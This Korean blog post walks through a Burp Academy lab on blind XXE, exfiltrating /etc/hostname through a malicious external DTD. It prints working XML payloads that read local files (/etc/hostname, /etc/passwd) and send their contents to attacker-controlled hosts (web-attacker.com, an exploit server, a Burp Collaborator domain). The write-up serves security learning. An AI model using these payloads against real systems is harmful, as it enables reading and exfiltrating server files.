---
layout: post
title: "Burp Academy 문제풀이 - Exploiting blind XXE to exfiltrate data using a malicious external DTD"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, XXE]
toc: true
---

# 개요
- Blind XXE 문제인데 XML의 파라메터 엔터티(Parameter Entity)를 통해 out-of-band 통신을 발생시키는 예제로 보인다. 
- 문제 주소: https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration


- 블라인드 XXE 설명 주소: https://portswigger.net/web-security/xxe/blind
- 난이도: PRACTITIONER (중간)

# 문제분석
- 이전 문제들과 마찬가지로 "Check stock" 기능을 통해 XML 을 삽입할 수 있다. 
- `/etc/hostname` 파일의 내용을 얻어내면 된다. 
- 내용을 HTTP 응답으로 직접확인할 수는 없다. Blind XXE를 응용해야 한다. 
```
This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, exfiltrate the contents of the /etc/hostname file.

Note
To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use the provided exploit server and/or Burp Collaborator's default public server.
```


# 준비
## exploit server
이 문제부터는 exploit server 가 등장한다. 다음과 같이 특정 경로 요청에 대해 어떤 응답을 보낼지를 설정할 수 있다. 

![exploit server](/images/burp-academy-exploit-servser.png)



# 1차 시도 
우선 Parameter 엔터티로 `/etc/hostname` 을 접근할 수 있는지 확인해본다. 
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<stockCheck>
	<productId>%file;</productId>
	<storeId>1</storeId>
</stockCheck>
```

안된다. XML 파싱에러가 발생했다. 
```
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 19

"XML parsing error"
```

## 2차 시도 
[XXE 설명 페이지](https://portswigger.net/web-security/xxe/blind){:target="_blank"}를 보면 다음 페이로드가 소개되어 있다. 

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

- `&#x25;` 는 HTML 디코드하면 `%` 이다. 
- /etc/passwd의 내용을 file 이라는 이름의 파라메터 엔터티에 저장해둔다. 
- eval이라는 이름의 파라메터 엔터티에 다이내믹 선언한 exfiltrate 라는 파라메터 엔터티의 값을 저장해둔다. 
- exfiltrate 엔터티는 HTTP 요청을 공격자의 웹 서버에 file 엔터티의 내용을 URL 쿼리 스트링으로 함께 보낸다. 

이 것을 다음과 같이 바꿔서 보냈다. 

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://exploit-0ae8003e0426eb73c02fa82501bd002e.exploit-server.net/?x=%file;'>">
%eval;
%exfiltrate;
```

보안 이유 때문에 Entity 는 사용할 수 없다는 응답이 돌아왔다. 
```
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 47

"Entities are not allowed for security reasons"
```

## 3차 시도 
여기서 부터는 잘 모르겠다. 정답을 봤다. 

# 해답
이 문제를 풀려면 Burp Collaborator와 통신이 가능한 Burp Suite Professional 버전이 필요하다. 

- STEP 1. Burp Suite Professional에서 Burp Collaborator 탭으로 이동한다. 
- STEP 2. "Copy to clipboard" 를 이용해 유니크한 Burp Collaborator 페이로드를 복사해둔다. 

![Burp Collaborator 페이로드 복사](/images/burp-academy-xxe-5-1.png)

- STEP 3. 다음 DTD 파일의 BURP-COLLABORATOR-SUBDOMAIN 을 복사한 페이로드로 바꾼다. 

```xml 
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
%eval;
%exfil;
```

예를 들어, 내 경우에는 다음과 같이 되었다. 
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://n8wqd73kghte5rc9tqfr8wq0frli98xx.oastify.com/?x=%file;'>">
%eval;
%exfil;
```

- STEP 4. exploit server 로 이동해서 위의 DTD 파일을 응답 Body 부분에 저장한다. 
- STEP 5. 유저가  "Check stock" 버튼을 눌렀을 때의 POST 요청 바디 부분을 다음과 같이 바꾼다. 

```xml 
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
```

내 경우에는 다음과 같이 된다. 

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a5200f2036c3c94c2e7ba5c01230041.exploit-server.net/exploit"> %xxe;]>
```

이 페이로드를  "Check stock" 버튼을 눌렀을 때의 POST 요청 바디로 전송한다. 400 Bad Request 응답이 돌아온다. 

![페이로드 전송](/images/burp-academy-xxe-5-2.png)


- STEP 6. Burp Suite Professional에서 Burp Collaborator 탭에서 "Poll now" 를 클릭한다. 
- STEP 7. 조금 기다리면 Burp Collaborator 서버로 통신한 DNS와 HTTP 통신이력이 보인다. HTTP 통신에 /ect/hostname 파일의 내용이 보인다. 

![Burp Collaborator 서버 통신](/images/burp-academy-xxe-5-3.png)

이 것을 정답제출 버튼을 누르고 제출하면 다음과 같이 풀이에 성공했다는 팝업이 나타난다. 

![풀이성공](/images/burp-academy-xxe-5-4.png)

# 구성도 
과정이 복잡해졌기 때문에 이해하기 어렵다. 이해를 위해 구성도를 그려보고 과정을 다시 한번 정리해보자. 

![구성도](/images/burp-academy-xxe-5-diagram.png)

- EC Site 에는 XXE취약점이 있지만 XXE의 결과가 응답페이지에 표시되지 않는다. 
- 공격자는 악의적인 DTD를 제공하는 서버를 구축한다. (hacker DTD Server)
- 이 DTD는 /etc/hostname 의 정보를 HTTP URL파라메터에 지정해 특정 서버로 요청하라는 지시를 담고 있다. 
- 위의 과정에서 특정서버는 Burp Collaborator서버를 사용했다. (Burp Collaborator서버를 사용하면 특정 경로로 특정 요청이 온 것을 확인하기 용이하다.)
- 유저(공격자)가 POST 요청으로 XXE 페이로드를 전달한다. 
- EC Site는 XXE 페이로드를 해석하는 과정에서 Burp Collaborator서버로 중요정보를 포함한 HTTP 요청을 보낸다. 
- 공격자는 Burp Collaborator서버에 문의해서 어떤 요청이 들어왔는지를 확인할 수 있다. 이 요청의 파라메터를 확인하는 것으로 중요정보를 입수할 수 있다. 